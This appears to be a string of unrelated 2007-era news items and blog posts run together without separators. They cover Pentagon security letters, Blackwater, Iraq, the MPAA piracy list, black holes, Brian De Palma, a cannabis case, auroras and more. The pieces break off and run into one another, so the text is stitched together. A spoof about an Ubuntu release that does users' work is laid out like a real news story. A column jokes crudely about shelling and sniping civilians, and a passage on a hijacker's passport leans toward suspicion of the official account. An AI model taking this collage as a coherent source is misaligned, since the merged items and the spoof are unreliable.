The 455 letters were issued to investigate potential terror threats posed by people directly connected to the Defense Department , including civilian employees , contractors , active duty troops , reservists and their families , military officials told the New York Times .
Recipients of the letters -- usually financial institutions , telephone companies or internet service providers -- are prohibited from disclosing that they received them , the ACLU says .
And although the Pentagon - issued letter do not require cooperation , those from the FBI are mandatory , records show that the letters are coercive and unclear that compliance to Defense - issued letters is voluntary .
" The expanded role of the military in domestic intelligence gathering is troubling .
These documents reveal that the military is gaining access to records here in the U.S.  in secret and without any meaningful oversight , " said Melissa Goodman , staff attorney with the ACLU 's National Security Project .
" There are real concerns about the use of this intrusive surveillance power . "
The Electronic Frontier Foundation joined the ACLU in filing a request for the documents under the Freedom of Information Act .
The groups filed a lawsuit against the Defense Department when it tried to withhold the documents earlier this year .
The New York Times first reported in January that the Pentagon was issuing National Security Letters , but the documents released this weekend provide the first glimpse at internal machinations behind their use .
A Pentagon review initiated after the Times article appeared , which was included in the heavily redacted documents , shows the letters were issued " with little guidance or training , no coordination within the military , no real recordkeeping , and an inadequate review process , " the ACLU says .
" The Fourth Amendment protects against the government 's effort to rummage broadly through the papers and documents of individuals without narrow and specific justifications , " said Arthur Eisenberg , Legal Director of the New York Civil Liberties Union , which joined in the suit .
" Yet the excessive secrecy surrounding the military 's use of national security letters opens the door to abuse .
Without oversight and accountability , there is nothing to stop the Defense Department from engaging in broad fishing expeditions . "

Crash - Proof Passport
Hijacker 's Passport and a Landing Gear Fragment Alone Survive Fiery Crash
This illustration from Chapter 1 of FEMA 's report shows what few pieces of aircraft debris passed entirely through the Towers .
A charred fragment of landing gear on the intersection of West and Rector streets was the only piece they traced to Flight 11 .
According to ABC News and the Associated Press , the passport of hijacker Satam Al Suqami was found a few blocks from the WTC .
1 2 The Guardian was skeptical : " the idea that Atta 's passport had escaped from that inferno unsinged [ tests ] the credulity of the staunchest supporter of the FBI 's crackdown on terrorism . "

Note the passport did not belong to Atta , as is commonly claimed .
Satam Al Suqami was supposedly on Flight 11 , the plane that hit the North Tower .
In that collision , the building 's core absorbed almost the entire airplane , which hit the northeast wall nearly dead center .

Krugman : ' Useless and dangerous ' mercenaries run amok in Iraq Nick Juliano
Published : Friday September 28 , 2007

The use of private security contractors to supplement the US military 's efforts to stabilize Iraq amounts to an inappropriate reliance on " mercenaries " that furthers the interpretation that President Bush " systematically ignores everything we 've learned over the past few centuries about how to make a modern government work , " columnist Paul Krugman writes .
" Mercenaries , whom Machiavelli described as ' useless and dangerous ' more than four centuries ago , " have a larger role in occupying Iraq than during any other US military campaign , the New York Times columnist writes Friday .
Mercenaries " are disunited , ambitious and without discipline , unfaithful , valiant before friends , cowardly before enemies , " Machiavelli writes in his treatise , The Prince .
" They have neither the fear of God nor fidelity to men , and destruction is deferred only so long as the attack is ; for in peace one is robbed by them , and in war by the enemy . "
Krugman 's assessment comes as Blackwater USA , the largest security firm operating in Iraq , faces increased scrutiny over its role in a Sept. 16 shooting that left at least eight Iraqis dead .
( Estimates of the attack 's Iraqi death toll range as high as 20 . )
" As far as I can tell , America has never fought a war in which mercenaries made up a large part of the armed force , " Krugman writes , citing a Brookings Institution report that private contractors have " suffered more losses in Iraq " that all coalition nations combined .
" And , yes , the so - called private security contractors are mercenaries .
They 're heavily armed .
They carry out military missions , but ... they do n't seem to be accountable to Iraqi or U.S. law . "
The incident this month was at least the 56th shooting involving Blackwater contractors this year in 1,873 convoy runs providing security to diplomats in Baghdad , according to State Department data reported by the Times .
The rate of shootings is nearly five times higher than Blackwater 's nearest competitor , DynCorp International , which in 2006 was involved in 10 shootings during 1,500 convoy runs .
( State did not release comparable numbers for this year , the Times reported . )
Initial government reports detailing the Sept. 16 shooting portray a chaotic scene where Blackwater guards encountered the aftermath of a car bomb , a shootout in a crowded traffic circle and an armed standoff between guards and Iraqi security forces , the Washington Post reports .
At one point a Blackwater guard pulled a gun on his colleagues and ordered them to " stop shooting , " an unnamed US official told the Post .
A two - page initial assessment of the Sept. 16 attack prepared by the State Department contradicts Iraqi witnesses who say Blackwater guards were unprovoked when they fired on a white sedan in a busy traffic circle .
Witnesses in the area said the car burst into flames , killing the occupants inside , including a woman holding an infant .
An Iraqi investigation has concluded the guards were not provoked .
" They used a rocket launcher or grenade launcher to hit the car , " an unnamed Iraqi police official told the Post , referring to the Blackwater guards .
" They were supported by two helicopters who were shooting from the air . "
There are different accounts of how the shooting started .
The State Department report says Blackwater guards believed they were returning enemy fire in the incident , which began just after noon on Sept. 16 .
Guards were escorting one " principal " -- a diplomat with the US Agency for International Development -- back to Baghdad 's heavily fortified Green Zone just a few minutes after a car bomb exploded .
The Times reported that witnesses saw Iraqi commandos firing from a guard tower near Nisour Square , where the shooting took place .
Blackwater guards could have misinterpreted that friendly fire as coming from insurgents .
At least three separate investigations are examining the incident , including an inquiry from the House Oversight Committee .
It 's chairman , California Democrat Henry Waxman , has accused the State Department of meddling with the investigation and encouraging Blackwater not to turn over key evidence .
Blackwater also is facing scrutiny of its actions in March 2004 , when four contractors were killed in Fallujah .
An report from Oversight Committee Democrats found the firm was more focused on cutting cost than protecting its employees , the Post reports .

Siege warfare has always been the nastiest kind .
Or maybe it just seems that way because the people who live in cities usually write the histories , and the only times that war really bums them out is when their own cities are under siege .
The rest of the time , when the armies are busy burning nomad villages and raping peasants , nobody notices .
It ’s not til Timur or Attila is at the gates of the Big City that “ violence ” appears as a problem in the minds of the fat guys who write the books .
The 20th century had some great sieges , like Leningrad , where the rules were the same as in Timur ’s time : we ’ll camp outside the walls and try to starve y’all to death , women and children first .
And to hurry up the slaughter , we ’ll lob in all the shells we can bring up over these damn marshes .
In the meantime , you townsfolk just try to stay busy cannibalizing each other , once the dogs and cats have all been fricasee ’d , and remember come January that varnished furniture makes excellent firewood .
This man would have used his nukes
But the 20th century invented a new kind of siege warfare , what you could call “ squeamish sieges . ”
Old - school besiegers would never have bothered to pitch their tents if they ’d had access to 21st - century weaponry ; they ’d just have melted the town and moved on , chuckling as they zoomed off into the smoky horizon .
Imagine trying to tell a Mongol commander that we ’ve got these nuke things but we are n’t allowed to USE ’em .
You ’d soon be experiencing the joys of having molten metal poured into your eyes , a favourite Mongol method of expressing strong disagreement .
We ’re a lot more confused than those men were .
We spend billions inventing stuff that we ’re too chicken to use , and then developing half - strength versions of that stuff in case we ever get semi-serious .
That ’s what those “ daisy cutter ” bombs are , you know -- just plain confessions that we ’re too scared to use our nukes but hoping we can make some half - assed non-nuclear nuke out of a fuel - air bomb ( like the Russians just did ) or by taping together a lot of littler bombs .
So what does one of these squeamish armies do when it ’s ordered to lay siege to a crowded slum ?
That was the Lebanese Army ’s problem this spring when it was ordered to root out a tough Jihadi gang called Fatah al Islam ( Islamic Conquest ) from a Palestinian camp called Nahr al Bared .
In a sane world , the Lebanese Army would just ask the USAF for a quick flyover with a tactical - size nuke , and that would be that .
But by 2007 that sort of deal was out of the question unless you happen to be running a place where the press wo n’t go , like Congo .
If the video cameras are running , you have to do a conventional siege and make a show of trying to “ minimize civilian casualties . ”
I love that “ minimize ” bit .
It ’s like they have a quota , like California highway patrol with speeders .
Every morning the brass assembles the troops , “ OK , lissen up , today I want a minimum of 23 , maximum of 28 kiddies zapped by our snipers , and somewhere in the neighbourhood of 50 - 60 housewives shredded by artillery fire .
The limit on actual combatants is zero , I repeat zero , until the next fiscal year . ”
You can track these squeamish sieges way back , but one example with a lot of similarities to Nahr al Bared - - only on a bigger scale - - was what the Brits did with an Irish insurgent group in Dublin in 1916 .
While the real troops were bogged down on the Western front , some Jurassic version of the IRA seized the main buildings in downtown Dublin with just a few hundred lightly armed , untrained troops .

I 'm neither a Zappa fan or a Zappa hater , but I love how he handles himself on this 1986 episode of Crossfire with Robert Novak ( download video , 50 meg Quicktime file ) .
During Tipper
Gore 's crackdown on dirty rock lyrics , Zappa found himself thrust into the role of first amendment spokes - musician , and he handled it expertly , confounding people like Novak with his direct , articulate approach to free speech and government censorship .
But Zappa 's ire is directed not at Novak , but at John Lofton , ( at the time ) a columnist for Reverend Sun Myung Moon 's Washington Times .
Lofton is practically frothing at the mouth , at one point even ridiculing Zappa 's stated interest in getting young people to register to vote , and Zappa quips that he actually likes Novak more than Lofton .
( Lofton now describes himself as a " recovering Republican " and is Communications Director of the conservative anti-Bush Constitution Party . )
And who has replaced Frank Zappa as the go - to musician on the political circuit ?

Dr. Dilma Da Silva and Dr. Raymundo Arroyave from the Texas A&M University College of Engineering are part of a research project that has received a $ 3.9 million grant from the National Science Foundation that will allow the university to acquire a next - generation , composable high - performance computing platform .
The MPAA may be gearing up for an RIAA - inspired assault on US colleges and universities .
Last week the group announced its support for the " Curb Illegal Downloading on College Campuses Act ( 2007 ) , " and MPAA head Dan Glickman said that his organization would work with school administrators to put an end to movie piracy on campuses , which Glickman says costs the industry $ 500 million annually .
Most telling , the group has heard the call of Representative Howard Berman and has compiled a list of the most piracy - ridden schools in higher education .
This is a page straight out of the RIAA playbook .
Here they are , the schools that made the MPAA 's " dishonor roll " and the number of students identified as making unauthorized use of copyrighted materials :
Columbia University - 1,198 University of Pennsylvania - 934 Boston University - 891 University of California at Los Angeles - 889 Purdue University - 873 Vanderbilt University - 860 Duke University - 813 Rochester Institute of Technology - 792 University of Massachusetts - 765 University of Michigan - 740 University of California at Santa Cruz - 714 University of Southern California - 704 University of Nebraska at Lincoln - 637 North Carolina State University - 636 Iowa State University - 586 University of Chicago - 575 University of Rochester - 562 Ohio University - 550 University of Tennessee - 527 Michigan State University - 506 Virginia Polytechnic Institute - 457 Drexel University - 455 University of South Florida - 447 Stanford University - 405 University of California at Berkeley - 398
A number of schools have the dubious distinction of being on both the MPAA and the RIAA list .
The overachievers are : Ohio University ( #1 RIAA /#18 MPAA ) , Purdue University ( # 2 , # 5 ) , University of Nebraska at Lincoln ( #3/#13 ) , UMASS ( # 6/#9 ) , Michigan State ( #7/#20 ) , North Carolina State ( #9/#14 ) , University of South Florida ( #11/#23 ) , Boston University ( # 15/#3 ) , and the University of Michigan ( #18/#10 ) .
In all , 10 schools appear on both lists , and Purdue University wins the Gold Medal for highest overall ranking between the two combined .
Whether or not the MPAA will get into the trenches and follow the RIAA 's pre-litigation strategy is not yet clear , and historically the MPAA has been less eager to wage a public campaign against file sharing .
But like Santa , the MPAA is making a list and checking it twice ... the question is , are they merely humoring Representative Berman or planning something more aggressive ?
Astronomers now believe there ’s a supermassive black hole at the centre of almost every galaxy in the Universe .
These black holes can have millions , or even hundreds of millions of times the mass of the Sun .
Unlike stellar mass black holes , the supermassive versions might have formed differently , going from a cloud of gas directly to a black hole – skipping the star stage entirely .
Since their discovery , astronomers still do n’t really know how supermassive black holes got going .
But there they are , inside most galaxies .
In fact , quasar observations show that supermassive black holes were present in the early Universe .
Quasars are some of the brightest objects in the Universe , blazing from the radiation emitted by supermassive black holes actively consuming material .
One possibility is that these monsters had humble beginnings , starting out as a massive star , going supernova , and then becoming a black hole .
It ’s a process astronomers understand fairly well .
The problem with this theory is that these early supermassive black holes must have been growing constantly right from the beginning , at the maximum rate predicted by physics .
And as we see today , galaxies go through active and quiescent stages depending on when their black hole is consuming material .
But a second possibility is that these black holes formed directly , pulling together so much material that they bypassed the stellar stage entirely .
Dr. Mitchell C. Begelman , a professor in the Department of Astrophysical and Planetary Sciences at the University of Colorado , Boulder recently published a paper entitled Did supermassive black holes form by direct collapse ?
This paper sketches out this alternate theory of black hole formation in the early Universe .
After the Big Bang , the Universe cooled enough for the first stars to form out of the original hydrogen and helium .
This was pure material , unpolluted by previous generations of stars .
Astronomers have calculated that these first stars , called Population III , would have a maximum rate that they could gather material together to form a star .
But what if there was much more gas around ?
Way beyond the limits that could form a star .
With a regular star , material comes in relatively slowly , creating a central mass .
With enough mass , the star ignites , and this creates and outward pressure that stops further material from compacting too tightly .
But Dr. Begelman has calculated that if the infall rate exceeds just a few tenths of a solar mass per year , the stellar core would be so tightly bound that the energy release of nuclear fusion would n’t be enough to stop the core from continuing to contract .
You would never have a star , you would just go from a cloud of hydrogen to a tightly bound central mass .
And then a black hole .
The question is , would it be possible to have material come together so quickly ?
It can , if something ’s pushing it … like dark matter .
According to Dr. Begelman , there could be several situations where an external force , like the gravity from a large halo of dark matter which could work to force gas into a central area .
In fact , material has been calculated falling into a black hole this quickly , because that ’s the rate it takes to power quasars .
But the question is , will this work if the black hole is n’t there , or really small .
Once there are a few solar masses of accumulated gas , the core begins to shrink under the pull of its increasing mass .
The object goes through a brief period of nuclear fusion when it reaches 100 solar masses , but it passes through this phase so rapidly that it does n’t get a chance to expand again .
Eventually the object reaches several thousand solar masses , and its temperature has climbed to several hundred million degrees .
At this point , gravity finally takes over , collapsing the core , and turning the object into a 10 - 20 solar mass black hole which then starts consuming all the mass around it .
From this point on , the black hole is able to draw in further material efficiently , growing at the maximum levels predicted by physics , eventually gathering up millions of times the mass of the Sun .
If too much material falls in , the baby supermassive black hole might act like a mini-quasar – Dr. Begelman has dubbed this a “ quasistar ” – blazing with radiation as infalling material backs up in the black hole ’s surroundings .
And there ’s the good news : these quasistars might be detectable by powerful telescopes .
However , they would have very short lifetimes , only lasting 100,000 years .
They might be marginally detectable by the upcoming James Webb Space Telescope .

The guys from The Pirate Bay are always working on interesting side - projects , but there is one in particular that 's so significant , it might be the future of filesharing .
For a while now , they have been working on a brand new protocol - which may come to replace BitTorrent in the near future .
Why a new protocol ?
Well , the current BitTorrent protocol is developed and maintained by BitTorrent Inc .
This company , founded by BitTorrent inventor Bram Cohen , recently decided to close the source of some newer additions to the protocol .
According to The Pirate Bay , this gives them too much power and influence .
Another reason for a new and improved protocol is the massive number of spammers and anti-piracy organizations that abuse the BitTorrent protocol , either to make money or to bust people who download infringing material .
The new protocol will be designed with these potential problems in mind .
The protocol will most likely use the .p2 p file extension compared to the .torrent extension BitTorrent uses right now .
The good thing is that the .p2 p files will be backwards compatible which should ensure a smooth transition from . torrent to .p2 p files .
It will be interesting to see whether other BitTorrent sites will support the new protocol .
Erik from Mininova , the most popular BitTorrent site at the moment , told us they will absolutely support the new protocol .
We at Torrent Freak are of course a bit concerned about these new developments since we owe our name to BitTorrent , but we wish The Pirate Bay crew the best ;)
The new protocol is still in the development phase , but the initial release is planned for sometime early next year .
More features and information about the new protocol , which is still nameless at this point , can be found at the protocol design page .
CNN does ' reality check ' on White House 's Iraq progress report David Edwards and Muriel Kane
Published : Friday July 13 , 2007 Print This Email
This CNN reported Friday that the House of Representatives has passed a bill calling for a withdrawal of US troops from Iraq by next April .
However , the bill is likely to be blocked by a Republican filibuster in the Senate and if it survives there will be vetoed by the president .
CNN then turned to a " reality check " from journalist Michael Ware in Baghdad on the White House 's Iraq report , released on Thursday , which claims progress on 8 out of 18 benchmarks set by Congress .
" The authors of this report are far more generous than I would ever be , " said Ware .
" For example , they suggested there 's been satisfactory progress in the area of sectarian violence
It 's quite a stunning claim ...
Here in Baghdad , they 're finding less bodies on the streets each morning tortured and executed .
But we 're still talking about five or six hundred each month .
...
It almost dishonors the suffering of the Iraqi people to say that . "
Ware then pointed out a couple of reasons why sectarian violence might be diminishing even without the efforts of American troops .
" About 50,000 Iraqis a month have been fleeing this country or have been displaced , " he stated .
" So there 's simply less targets for the sectarian violence .
...
The ethnic cleansing has been successful .
...
Finally , we 're seeing the American military is now allowing some Sunni neighborhoods to have their own Sunni militias .
...
If there 's a Sunni militia in your neighborhood , the police death squad can't get to you . "
" It 's an extraordinarily difficult thing to gauge whether the surge is , in fact , working or not , " Ware concluded , pointing out that the surge only affects a small part of Iraq and also that Iraqi insurgents have greatly stepped up their own attacks against American forces since the surge began .
The following video is from CNN's American Morning , broadcast on July 13 .
Consumerism has run amok , most of us can agree on this .
Americans , on the whole , buy things we cannot afford .
We buy nice cars , clothes , eat at fancy places , drink fine wines , pretentious coffees , and $ 12 martinis .
We stretch to afford the apartment , condo , townhouse , or house that is probably not within our budget .
We covet electonic gadgets , like ipods , and pda phones , brand name watches , and TVs .
Few would dispute this .
So , I guess the question is , why ?
What are we trying to accomplish ?
What void are we trying to fulfill ?
Who are we trying to impress ?
Ahhh ...
I think that last question is the most important one .
Especially for the twenty and thirty somethings among us .
We have all read , heard and experienced the phenomenon that goes on after college .
Some of our friends go on to Med School , Law School , B - School .
Some get entry level jobs , others get jobs that somehow pay much better than the rest of us .
Suddenly , we go from all being poor college students to varying levels of economic means .
We get together on the weekends to ogle at each other 's cars , compliment their shoes , and go out for drinks at the latest trendy hot spot .
All the while competing to see who can run up higher credit card debts .
What if we did something different when we got together ?
Many of us have moved past some of the pretentious stuff that I just talked about , and instead have dinner parties , game night , and other inexpensive ways to gather .
But let 's take it a step further .
What if we got together with our friends once a month and compared our balance sheets ?
What if this was the social norm ?
What if EVERYONE , not just us whacky personal finance bloggers , posted our net worth statements every month ?
How would that change our spending habits ?
Would we be less ready to compliments our buddy 's hot new sports car if we knew he could not afford it ?
What if our friend just got some trendy new Gucci shoes for $ 300 , and put it on his already maxed out Nordstrom card ?
And we all knew it !
Would he even do it in the first place ?
It 's funny how private we are about our financial lives .
Are we embarassed by how bad it is ?
Or are we more embarassed by how good it is ?
We talk with our friends about our most personal and private feelings .
Dreams , fears , drugs , fantasies , and even love .
Nothing is off limits .
Except money .
Disagree ?
Who are your five closest friends ?
What is their favorite kind of food ?
Are they drinkers ?
Where are the last three places they have traveled ?
What is their net worth ?
Would You Buy This House ?
This tough real estate market may be grating on some of you .
Especially those people who want to sell their house but are n’t meeting much with success .
So what ’s an impatient homeowner to do ?
How about taking a step back and assess the situation .
Could it be the case that your house just looks too weird ?
This house is one - of - a- kind and truly unique in every way .
It lives somewhere in the SF Bay Area , along the major freeway I take to head off to my job in San Francisco , and every time I drive by , I always wonder who would buy such a novel looking home .
In fact , I wonder how easily something like this could sell .
Since I enjoy learning about how markets work , I often try to analyze what makes for a successful sale or purchase .
One thing I ’ve learned is that for certain items , it could be hit or miss because of special characteristics it could have .
Uniqueness may sell pretty well …. or not at all .
In the case of this house , which has built some kind of reputation , selling it may not be a problem as someone out there would enjoy being recognized as the owner of “ The Flinstone House ” .
Get a load of this “ unique ” matching mail box .
As a rule though , ordinary items for sale that are made too unusual will encounter a shrinking market .
I remember the time while we were home shopping seven years ago and stumbled onto a pretty nice house that was professionally designed by an architect and interior designer .
The thing was made out to be a period home that looked like it stepped out of the Victorian era .
Just one look and you knew it was n’t going to move too quickly — it was way too frilly , felt too cluttered with its heavy use of fabric ( drapes covering the doors ? ? ) and felt too dark .
It finally sold after the owners took down the frills and generalized its look .
So when you ’re trying to unload something make sure things are as generic as they can be .
Especially if it ’s a commodity or if you ’re trying to attract a mass market .
Else , you can reach for the moon and drum up some * serious * marketing or story angle to capture the market ’s attention — yeah like this house has .
P.S. This house is not really for sale ; just spoke of it in hypothetical terms .

NEW YORK ( Reuters ) - Veteran Hollywood director Brian De Palma has lashed out at what he calls the censorship of his new film about Iraq and the chilling effect of corporate America on the war .
Director Brian De Palma on the set of " Redacted " in an undated image courtesy of Magnolia Pictures .
REUTERS / Handout
De Palma ’s film , “ Redacted , ” is based on the true story of a group of U.S. soldiers who raped and killed a 14 - year - old Iraqi girl and murdered members of her family .
It has stunned audiences for its shocking images and rattled American conservative commentators before its U.S. opening next month .
But De Palma says he is upset that the documentary - style drama -- its name derived from his view that news coverage of the war has been incomplete -- has been censored .
The film ’s distributor , Magnolia Pictures , ordered the faces of dead Iraqis shown in a montage of photographs at the end of the film be blacked out .
“ I find it remarkable .
‘ Redacted ’ got redacted .
I mean , how ironic , ” De Palma , who made his name directing violent films like “ Scarface ” and “ The Untouchables , ” said in an interview .
“ I fought every way I could in order to stop those photographs from being redacted and I still lost . ”
De Palma has loudly argued the issue in public , including sparring with Eamonn Bowles , the president of Magnolia , during a recent forum at the New York Film Festival .
Bowles countered that possible future lawsuits by the families of the dead Iraqis meant the photos had to be edited .
Bowles said Magnolia had been put in “ an untenable legal position , ” and that De Palma lost rights to the film ’s final cut in recent arbitration with the Directors Guild of America .
Slideshow ( 5 images )
“ We were always open about letting him make the sort of film he wanted to make , ” Bowles said in an interview , adding not many distribution companies would have supported the film at all .
CORPORATE POWER
De Palma , who has criticized Hollywood for not being willing to finance such independent films , said he was shocked at his own lack of editorial control .
“ I ca n’t even get the photographs out there , that was all surprising to me , ” he said .
“ What is going on here ?
These are war photographs .
...
You see these and you go ‘oh boy , this should n’t be happening . ’”
The 67 - year - old director said he blames “ the insurance companies ” for exercising too much control over film distribution .
Bowles admitted Magnolia could not insure the film if it ran the unedited photos , which were too graphic to run in mainstream newspapers or television reports .
De Palma said he expected the images in “ Redacted ” to stir U.S. public debate about the conduct of American soldiers .
Abeer Qasim Hamza al - Janabi was gang - raped , killed and burned by U.S. troops in Mahmudiya , south of Baghdad , in March 2006 .
Her parents and another family member were also killed .
He said the film provided a realistic portrait of U.S. troops and how “ the presentation of our troops has been whitewashed ” by mainstream media .
De Palma , who looked at the atrocities of conflict in the 1989 film “ Casualties of War , ” which also centers on the rape of a young girl by U.S. soldiers , believes news coverage of wars had changed since the Vietnam War .
“ We saw fallen soldiers , we saw suffering Vietnamese .
We do n’t see any of that now , ” he said .
“ We see bombs go off , but where do they come down ?
Who do they hit ? ”
The U.S. invasion of Iraq was “ clearly a mistake , ” he said , that was perpetuated by “ defense contractors , big corporations of America ” profiting from the war .
“ How many billions of dollars are those companies making ?
And who gets more famous than ever ?
The media .
There is nothing like a war to fill the airwaves 24 hours a day , ” he said .

The temple of Zeus has not been long unattended by priestesses
This is a landmark event to celebrate official recognition of their religion by a court last year .
The Greek Orthodox Church has said they are miserable resuscitators of a degenerate dead religion .
But the ceremony went ahead , with crowds watching priests and priestesses , who said the event was a symbol of their civic rights .
In 2003 , white - clad worshippers performed an illicit ceremony at the Temple of Hephaestus , just below the Acropolis .
At that time they were chased off the site by ministry of culture staff .
Despite vigorous opposition from the highly conservative Greek Orthodox Church , a court last year officially recognised the revived ancient Greek religion .
The worshippers are loyal to Zeus and the other Olympians
Ms Peppa said she had been given official permission to use the temple , but there were fears that the culture ministry , which administers the site , might give way to pressure from the church .
The president of the Association of Greek Clergymen , Father Efstathios Kollas , has described the followers of the Olympic gods as a handful of miserable resuscitators of a degenerate dead religion who wish to return to the monstrous dark delusions of the past .
Ms Peppa and her followers aspire to have the rights afforded to Britain 's druids who worship at Stonehenge , and Danish believers in Thor and the Nordic gods who are allowed to perform marriages , baptisms and funerals .
From the “ What The ? ! ” files comes the story of Jennifer Dowell White , who was held in the jail for a month for no apparent reason , Lisa Provence reports for The Hook .
She appeared before a city grand jury on August 20 , who was considering indicting her for obtaining money under false pretenses , but they decided not to .
Nonetheless , she was held in jail until just yesterday , the apparent fault of Charlottesville Clerk Paul Garrett .
Her attorney had repeatedly requested a copy of the indictment that would presumably be required to keep
White in jail , but Garrett would n’t send it — the paperwork had apparently been lost in his office .
Garrett declined comment .
Garrett was last in the news back in April , when he was caught obtaining $ 52,000 from the state by lying about getting his office ’s records online .
Garrett , a Democrat , was most recently reelected in 2003 .
9:30 pm Update : I see that Henry Graff reported on this for NBC 29 and did get a comment out of Paul Garrett .
He said that he was n’t necessarily the obstacle , that “ there are various ways that could have been addressed , ” though not knowing anything about the legal system , it ’s all greek to me .

From Reuters :
An Interior Ministry official , who did not want to be named because he was not authorised to release the figures , said 1,944 civilians were killed in May , a 29 percent hike over April .
At least 174 soldiers and policemen were killed in the same period .
The death toll was based on statistics compiled by Iraq 's ministries of interior , defence and health on the number of people killed and wounded in attacks in Iraq .
After three months of declines , there has been a sharp rise in the number of sectarian murders in Baghdad .
Mortar attacks in the capital are becoming deadlier and car bombs remain common .
Spalding 's story was backed in a letter to the court from his doctor
Gregor Spalding admitted cultivating the drug at his home in Blairgowrie .
Perth Sheriff
Court heard the 30 - year - old was arrested in April after police picked up the crop 's smell while at his home looking for someone else .
Sentence was deferred for six months for Spalding to be of good behaviour .
He was assured that if he maintained this he would be treated " leniently " .
Relieving pain
The court was told his " amateurish attempt " to cultivate cannabis was provoked by chronic pain he had suffered for three years .
Spalding said prescription medicine had failed to tackle pain caused by constant itching around his genitals .
He had decided to try using the drug as a painkiller , after reading about it on the internet , and wanted to grow cannabis himself , instead of buying it from a drug dealer .
It was a stupid amateurish attempt .
I am prepared to give you a chance
Sheriff Derek Livingston
His doctor wrote a letter to the court confirming Spalding had suffered chronic pain from an itching condition known as pruritus for three years .
The doctor added : " It is quite reasonable that he thought cannabis might help his condition as there have been reports in the press of cannabis relieving pain in multiple sclerosis and other conditions . "
The court heard Spalding had not been in trouble with the authorities before and had now been referred to Dundee 's Ninewells Hospital .
Sheriff Derek Livingston said : " It does strike me that this is n't a case where someone is growing the plant to supply it to others .
" It was a stupid amateurish attempt .
I am prepared to give you a chance .
As long as it remains proscribed , you cannot grow cannabis plants in your house . "
London , UK - The Linux distribution , Ubuntu , has grown quickly because of its ease of use .
It makes the normally confusing Linux something even a Windows user can use .
However , the Ubuntu developers are aiming even higher for the future .
The next release , " Gutsy Gibbon , " will be even easier to use , but the " Harry Hamlin " release will actually do your work for you .
" You just pop in the CD , fill out a short form , and you 'll never have to touch your computer again .
Ever .
You can use your computer for fun if you like , but it 's not necessary , " said Ubuntu founder Mark Shuttleworth .
Shuttleworth would not share technical details of how the software works , but said that it " relies on advanced heuristics and thermionics to send out e-mail , write code , and even play games for you . "
Many feel this feature will be the killer app that will let Ubuntu supplant Windows as the desktop of choice .
However , not everyone believes the end of Windows domination is near .
Computer consult John Querty said , " With a system like this , people could step away from their computers and have time to interact with others .
I just do n't see that happening . "
Current Ubuntu users can't wait for the " Harry Hamlin " release .
" I can't wait , " said Scott Biggs , who has been using Ubuntu since its first release , " I will be able to just boot the computer , hop in the shower and by the time I get out it 's finished with my entire day 's work .
Thank goodness WoW works under Wine . "
Shuttleworth said Harry Hamlin would be released in April 2008 .

In the timeless quest for healthier , younger looking skin , scientists from the University of Cincinnati and Tokyo Medical University have made an important discovery toward manipulating skin tone and color .
The implications of this research range from helping doctors develop more natural looking bioengineered skin grafts to helping cosmetics companies develop new products for achieving the “ perfect ” sunless tan .
The research study , published in the September print issue of The FASEB Journal , shows for the first time how to manipulate skin color and tone using cells previously thought to play no significant role in this function .
“ Most immediately , this study should lead to bioengineered skin grafts that more closely resemble the natural tone and color of recipients , which may help reduce the appearance of scarring , ” said Gerald Weissmann , MD , Editor - in - Chief of The FASEB Journal .
“ Down the road , however , this study opens doors to new types of cosmetics based on our understanding of how and why ‘ skin deep ’ differences in appearance evolved over millions of years . ”
In the article , researchers describe how cells responsible for pigmentation , called melanocytes , can be controlled by the most commonly occurring skin cells , called keratinocytes , which produce no pigment of their own .
Working with bioengineered skin , which is used for some types of skin grafts , the researchers juggled various mixtures keratinocytes from people with different types of skin colors .
In turn , the keratinocytes produced chemical signals to “ tell ” melanocytes to produce more or less pigment , called melanin , as well as how to distribute that pigment .
The researchers found that using keratinocytes from light - skinned individuals had a lightening effect on the bioengineered skin graft material , while keratinocytes from dark - skinned individuals had a darkening effect .
This is a significant finding as it shows a conclusive link between keratinocytes and melanocytes and because keratinocytes are much easier to manipulate than melanocytes .
Medical conditions that sometimes require the use of bioengineered skin grafts include severe burns , scleroderma , epidermis bullosa , diabetes , and venous leg ulcers .
In addition , the study ’s senior researcher , Raymond Boissy , says this study also could “ help the quality of life for people with pigment diseases such as vitiligo , melasma and age spotting by making their skin more healthy looking . ”

Vladimir Putin 's warnings against military action against Iran deserve to be taken very seriously .
Since we 're not contemplating actually conquering Iran and trying to occupy its territory , people need to understand that the post - strike diplomatic environment is going to be much more important to the future of the Iranian nuclear program than is any damage that bombing Iran with our on - the - table options might or might not do .
If Russia decides to just send some scientists with schematics and materiel over to Iran and show them how to build a nuclear bomb , then -- bam -- nuclear bomb .
Conversely , at the moment not only is Iran under some diplomatic pressure to stop short of weaponizing , many countries around the world are taking direct measures to prevent the Iranians from just easily going and buying the stuff they need .
Insofar as an unprovoked American military attack convinces other countries that the real dangerous lunatics live in DC rather than Teheran , countries around the world could cut back on their vigilance and make it much easier for an Iranian nuclear program to succeed .
The point is that when people talking about the Iranians being such - and - such time period away , or some bombing effort taking them back x number of years , they 're talking as if progress toward a nuclear weapon proceeds at a constant pace .
In practice , one of the factors that determines how quickly you can proceed is the international context .
Right now , things are pretty tricky for Iranian nuclear scientists .
Military action that does n't reflect a firm , UN - backed consensus grounded in some reasonable interpretation of international law ( military action that does reflect such a consensus seems very , very unlikely but in principle it could happen ) could dramatically alter that .

Shuttle 's Eye View
Auroras seem to spread and sway across the sky above us .
But to astronauts in the space shuttle above the earth , auroras seem to cling to the surface below .
In fact , auroras begin at about 60 miles above the Earth 's surface , above most of the atmosphere .
Imagine : if you could " drive " from the surface to the bottom of an aurora , it would take you an hour at 60 m.p.h.!
The space shuttle , in its " low earth " orbit 250 kilometers above Earth 's surface , is a great spot for observing auroras from above the polar regions .
This photo , taken from the shuttle , shows red - tipped arcs near the south pole .
In the next section , we 'll look into where the different colors in auroras come from .
This image shows the tail of the Space Shuttle as it orbits above an aurora .
( The cargo bay of the spacecraft is facing the earth 's surface , which makes the tail seem to hang down . )
This shuttle image shows the characteristic oval shape of the aurora .
What Do Auroras Look Like From Space ?
Listen to Maurico Peredo of NASA 's Goddard Space Flight Center .
To Listen to this clip you will need the RealAudio player .
What We See Auroras form in rings centered over the Earth 's magnetic poles .
During an aurora , rings form around the North and South poles at the same time .
Even near the poles , someone on Earth can only see a tiny section of the auroral oval .
Look at the satellite image of the aurora borealis to the left .
Notice that the center of the auroral ring is not on the line between the day side ( orange ) and the night side .
This is because the rings center around the magnetic poles , not the geographic poles , which define the Earths ' axis of rotation .
The aurora looks orange in this image , but the shades of orange represent the intensity ( brightness ) of radiation at wavelengths we can't see .
You can see that in the image more of the activity seems to be on the night side of the Earth .
